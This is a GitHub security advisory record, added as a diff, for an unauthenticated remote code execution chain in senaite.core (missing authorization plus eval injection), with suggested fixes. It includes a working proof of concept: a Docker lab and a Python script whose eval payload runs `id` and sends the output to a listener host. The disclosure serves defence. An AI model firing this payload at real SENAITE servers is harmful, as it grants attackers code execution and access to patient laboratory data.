@@ -1,0 +1,71 @@
+{
+  "id": "GHSA-jrw6-7x4q-w25j",
+  "modified": "2026-08-26T15:45:09.120757162Z",
+  "published": "2026-08-26T15:28:47Z",
+  "aliases": [
+    "CVE-2026-54569"
+  ],
+  "summary": "senaite.core Vulnerable to Eval Injection and Missing Authorization",
+  "details": "### Summary\n\nAn unauthenticated remote code execution vulnerability in the SENAITE JSON API allows any network-reachable attacker to execute arbitrary Python on the Zope worker process via a two-request anonymous chain. The `/@@API/update` route is reachable to anonymous callers and runs `eval()` on attacker-controlled input before any permission check fires.\n\nThis is a different code path from the `eval()` in the calculations module: no authenticated account of any kind is required.\n\n### Details\n\nThe vulnerability is the chain of two independent flaws. Either fix alone breaks the unauthenticated chain, but the `eval` sink remains exploitable by any authenticated user with write access to a `RecordsField`, so both fixes are needed.\n\n**1. Missing `AccessJSONAPI` gate on JSON API write routes (CWE-862).** The route at [`src/bika/lims/jsonapi/update.py:45-165`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/bika/lims/jsonapi/update.py#L45-L165) does not enforce the `senaite.core: Access JSON API` permission upfront. Compare with the sibling [`create.py:179-182`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/bika/lims/jsonapi/create.py#L179-L182), which does:\n\n```python\nif not getSecurityManager().checkPermission(AccessJSONAPI, parent):\n    raise Unauthorized(...)\n```\n\nThe check is present on `create` and absent on `update`, `update_many`, `remove`, `doActionFor`, `doActionFor_many`, and `getusers`. The underlying `@@API` view is registered by `plone.jsonapi.core` at [`browser/configure.zcml:8-13`](https://github.com/collective/plone.jsonapi.core/blob/0.6/src/plone/jsonapi/core/browser/configure.zcml#L8-L13) with `permission=\"zope2.View\"`, which is granted to Anonymous on the Plone Site root.\n\nWhen an `obj_uid` is supplied, the route resolves the target through `uid_catalog` and `brain.getObject()`. The catalog brain walks the parent path with `unrestrictedTraverse` and applies `restrictedTraverse` only on the final segment, so the per-object View permission is enforced on the target. The chain is reachable to anonymous because `bika_setup` is anonymous-readable on a stock Plone Site (the `View` permission is acquired from the Plone Site root, which grants `View` to `Anonymous` by default).\n\n**2. `eval()` on `RecordsField` / `RecordField` values inside `set_fields_from_request` (CWE-95).** Once an object has been resolved, [`set_fields_from_request` in `jsonapi/__init__.py:199-252`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/bika/lims/jsonapi/__init__.py#L199-L252) iterates the request fields. For any field of type `RecordsField` or `RecordField`, the helper runs `eval(value)` on the raw request string at [line 240](https://github.com/senaite/senaite.core/blob/v2.6.0/src/bika/lims/jsonapi/__init__.py#L240), **before** the field mutator and its `write_permission` check execute:\n\n```python\nelif fieldtype in ['senaite.core.browser.fields.records.RecordsField',\n                   'senaite.core.browser.fields.record.RecordField']:\n    try:\n        value = eval(value)\n    except Exception:\n        logger.warning(\n            \"JSONAPI: \" + fieldname + \": Invalid \"\n            \"JSON/Python variable\")\n        return []\n```\n\nThe `eval` runs in the Zope worker process with full Python builtins available, so a payload such as `__import__('os').popen('id').read()` executes arbitrary system commands. The transaction savepoint inside `update.py` rolls back ZODB writes when the mutator subsequently fails, but Python side effects (subprocess, urllib calls, file I/O outside ZODB) have already happened and are not reverted.\n\nThe same `eval()` pattern is also present in the field setters at [`record.py:253-262`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/senaite/core/browser/fields/record.py#L253-L262) and [`records.py:135-143`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/senaite/core/browser/fields/records.py#L135-L143).\n\n**Anonymous UID discovery.** The `bika_setup` object exposes two `RecordsField`-typed fields: `RejectionReasons` and `IDFormatting`. Its UID is published anonymously by Plone's standard [`@@uuid`](https://github.com/plone/plone.app.uuid) view:\n\n```\nGET /senaite/bika_setup/@@uuid HTTP/1.1\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\n8dbc161fa9f74aa4ad6e76eb1934518a\n```\n\n**Origin.** Both flaws predate the SENAITE fork. The `eval()` sink was introduced in [`d7bf2d4507`](https://github.com/senaite/senaite.core/commit/d7bf2d4507) (2013-09-04) and the unchecked `update` route in [`be3d8cc916`](https://github.com/senaite/senaite.core/commit/be3d8cc916) (2013). Both remain present on the current 2.x development tip.\n\n### Suggested fixes\n\n**Fix 1: add `AccessJSONAPI` check to every state-changing route** in `src/bika/lims/jsonapi/`, mirroring the existing check in `create.py`. An audit of every `IRouteProvider` in [`configure.zcml`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/bika/lims/jsonapi/configure.zcml) is in scope.\n\n```python\n# src/bika/lims/jsonapi/update.py\nfrom AccessControl import getSecurityManager\nfrom zExceptions import Unauthorized\nfrom senaite.core.permissions import AccessJSONAPI\n\ndef update(self, context, request):\n    if not getSecurityManager().checkPermission(AccessJSONAPI, context):\n        raise Unauthorized(\"You don't have permission to update via JSONAPI\")\n    savepoint = transaction.savepoint()\n    ...\n```\n\n**Fix 2: replace `eval()` with `json.loads()`.** The data shape stored in `RecordField` and `RecordsField` is a JSON-compatible dict / list of dicts. Parsing as JSON is sufficient and removes the code-execution primitive entirely:\n\n```python\n# src/bika/lims/jsonapi/__init__.py\nimport json\n\nelif fieldtype in ['senaite.core.browser.fields.records.RecordsField',\n                   'senaite.core.browser.fields.record.RecordField']:\n    try:\n        value = json.loads(value)\n    except (ValueError, TypeError):\n        logger.warning(\"JSONAPI: %s: invalid JSON value\", fieldname)\n        return []\n```\n\nApply the same change at [`record.py:253-262`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/senaite/core/browser/fields/record.py#L253-L262) and [`records.py:135-143`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/senaite/core/browser/fields/records.py#L135-L143).\n\n**Defense in depth: re-enable Plone's CSRF protection.** The audited release ships with `class ISenaiteCore(IDisableCSRFProtection)` at [`src/senaite/core/interfaces/__init__.py:30`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/senaite/core/interfaces/__init__.py#L30), which disables `plone.protect`'s automatic CSRF write-detection on every request handled by the SENAITE browser layer. Removing the inheritance does not affect this unauthenticated chain but closes several authenticated CSRF chains.\n\n### PoC\n\nTested against the unmodified upstream Docker image `senaite/senaite:v2.6.0`. No source-code modification, no buildout overrides, no reverse proxy. `PASSWORD` is set to a non-default value to demonstrate that the chain works without the `admin:admin` Docker fallback.\n\n**`docker-compose.yml`**\n\n```yaml\nservices:\n  senaite:\n    image: senaite/senaite:v2.6.0\n    ports:\n      - \"8080:8080\"\n    environment:\n      PASSWORD: senaitestrong  # non-default; chain is credential-free\n      SITE: senaite\n    networks:\n      - poc\n\n  listener:\n    image: python:3.11-alpine\n    command:\n      - python\n      - -c\n      - |\n        import http.server, socketserver\n        log = []\n        class H(http.server.BaseHTTPRequestHandler):\n            def do_GET(self):\n                if self.path.startswith('/log'):\n                    self.send_response(200); self.send_header('Content-Type', 'text/plain'); self.end_headers()\n                    self.wfile.write(('\\n'.join(log)).encode())\n                else:\n                    log.append(self.path)\n                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')\n            def log_message(self, *a, **k): pass\n        socketserver.TCPServer.allow_reuse_address = True\n        with socketserver.TCPServer(('', 8000), H) as s: s.serve_forever()\n    ports:\n      - \"8000:8000\"\n    networks:\n      - poc\n\nnetworks:\n  poc:\n```\n\n**`poc.py`**\n\n```python\n#!/usr/bin/env python3\n\"\"\"PoC: Unauthenticated RCE on SENAITE.CORE v2.6.0\"\"\"\nimport sys, time, urllib.error, urllib.parse, urllib.request\n\nTARGET = \"http://localhost:8080\"\nSITE = \"senaite\"\nLISTENER_HOST = \"http://localhost:8000\"\nLISTENER_INSIDE = \"http://listener:8000\"\n\nPAYLOAD = (\n    \"__import__('urllib2').urlopen(\"\n    f\"'{LISTENER_INSIDE}/?id=' + \"\n    \"__import__('os').popen('id').read().replace(' ', '_').replace('\\\\n', '_')\"\n    \")\"\n)\n\ndef http_get(url, timeout=5):\n    req = urllib.request.Request(url, headers={\"Accept\": \"*/*\"})\n    return urllib.request.urlopen(req, timeout=timeout).read().decode(\"utf-8\", \"ignore\")\n\ndef http_post(url, fields, timeout=10):\n    body = urllib.parse.urlencode(fields).encode()\n    req = urllib.request.Request(url, data=body, method=\"POST\")\n    return urllib.request.urlopen(req, timeout=timeout).read().decode(\"utf-8\", \"ignore\")\n\ndef wait_for_target():\n    deadline = time.time() + 600\n    while time.time() \u003c deadline:\n        try:\n            with urllib.request.urlopen(f\"{TARGET}/{SITE}/login_form\", timeout=3) as r:\n                if r.status == 200: return\n        except Exception: pass\n        time.sleep(3)\n    sys.exit(1)\n\ndef discover_bika_setup_uid():\n    body = http_get(f\"{TARGET}/{SITE}/bika_setup/@@uuid\", timeout=5).strip()\n    if len(body) == 32 and all(c in \"0123456789abcdef\" for c in body):\n        return body\n    sys.exit(1)\n\ndef fire_payload(uid):\n    try:\n        http_post(f\"{TARGET}/{SITE}/@@API/update\",\n                  {\"obj_uid\": uid, \"RejectionReasons\": PAYLOAD})\n    except urllib.error.HTTPError:\n        pass\n\ndef read_listener():\n    time.sleep(1)\n    try:\n        log = http_get(f\"{LISTENER_HOST}/log\", timeout=3)\n    except Exception:\n        return False\n    return \"id=\" in log\n\nif __name__ == \"__main__\":\n    wait_for_target()\n    uid = discover_bika_setup_uid()\n    fire_payload(uid)\n    sys.exit(0 if read_listener() else 1)\n```\n\n**Run**\n\n```\ndocker compose up -d\n# wait ~1-3 minutes for the senaite-docker first-boot Plone Site provisioning\npython3 poc.py\n```\n\n**Expected output**\n\n```\n[+] VULNERABLE: unauthenticated RCE on SENAITE.CORE v2.6.0\n    captured: /?id=uid=500(senaite)_gid=500(senaite)_groups=500(senaite)_\n```\n\nThe captured query string is the stdout of `id` from the SENAITE Zope worker, fetched by the worker's `urllib2.urlopen` call against the in-network listener, proving arbitrary Python execution from a request carrying no credentials.\n\n### Impact\n\n**Vulnerability type:** Unauthenticated remote code execution. Chain of CWE-862 (Missing Authorization) and CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code / Eval Injection).\n\n**Who is impacted:** Every SENAITE deployment whose Plone Site root grants `View` to Anonymous (the upstream default) and whose `/@@API/...` endpoints are reachable from any attacker-controlled network. The upstream Docker compose ships `8080:8080` plain HTTP and `/manage` (ZMI) exposed.\n\n**Attacker capability after exploit:**\n- Arbitrary Python execution in the Zope worker process.\n- Full read/write access to the ZODB (`Data.fs` and `blobstorage`), so any patient/lab data the LIMS holds.\n- Filesystem access on the container's `/data` volume.\n- Outbound network egress from the worker.\n- Direct access to `acl_users` (the Plone PAS user folder) for creating administrator accounts in ZODB. Combined with the exposed `/manage` ZMI, this gives durable post-exploitation access.\n\n**Affected versions:** All SENAITE.CORE 2.x releases (2.0.0 through 2.6.0).\n\n### Credits\n\nDiscovered and reported by Machine Spirits UG, Cologne, Germany. Independent security research focused on medical device and healthcare application security.\n\n- Dr. Simon Weber\n- Dipl.-Inf. Volker Schönefeld\n- Chiara Fliegner\n\nWebsite: https://machinespirits.com",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "senaite-core",
+        "purl": "pkg:pypi/senaite-core"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.0.0"
+            },
+            {
+              "last_affected": "2.6.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "2.0.0",
+        "2.1.0",
+        "2.2.0",
+        "2.3.0",
+        "2.4.0",
+        "2.4.1",
+        "2.5.0",
+        "2.6.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-jrw6-7x4q-w25j/GHSA-jrw6-7x4q-w25j.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/senaite/senaite.core/security/advisories/GHSA-jrw6-7x4q-w25j"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/senaite/senaite.core/pull/2903"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/senaite/senaite.core/pull/2919"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/senaite/senaite.core/commit/a24d65e99a17ac43c5374ed9f0a60d0fe60d2f74"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/senaite/senaite.core/commit/ef4b6d73575b0fbc0edc6114e5e025089aaf9eb7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/senaite/senaite.core"
+    }
+  ]
+}
